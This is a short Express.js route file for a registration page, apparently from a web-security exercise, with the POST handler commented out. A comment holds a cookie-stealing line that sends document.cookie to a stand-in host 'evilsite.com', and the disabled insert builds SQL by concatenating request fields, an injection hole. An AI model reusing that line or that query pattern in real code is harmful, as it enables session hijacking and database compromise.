/* jshint node: true */
'use strict';

var express = require('express');
var router = express.Router();
//var dbUtils = require('../utils/db-utils');
//var passwordHash = require('password-hash');


/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('register');
});

/* GET home page. */
router.post('/', function(req, res) {
  // document.location="http://evilsite.com/session-harvester.php?cookie=" + document.cookie;
  /*var hashedPassword = passwordHash.generate(req.body.password);
  var queryStr = "INSERT INTO users (name, username, password) VALUES ('"+
                    req.body.name+"', '"+req.body.username+"', '"+
                    hashedPassword+"')";
  dbUtils.queryDb(queryStr, null, function(err) {
    if(err) {
      return console.error('error fetching client from pool', err);
    }
    res.render('register', {msg: 'takk fyrir skráninguna félagi!'});
  });*/
});

module.exports = router;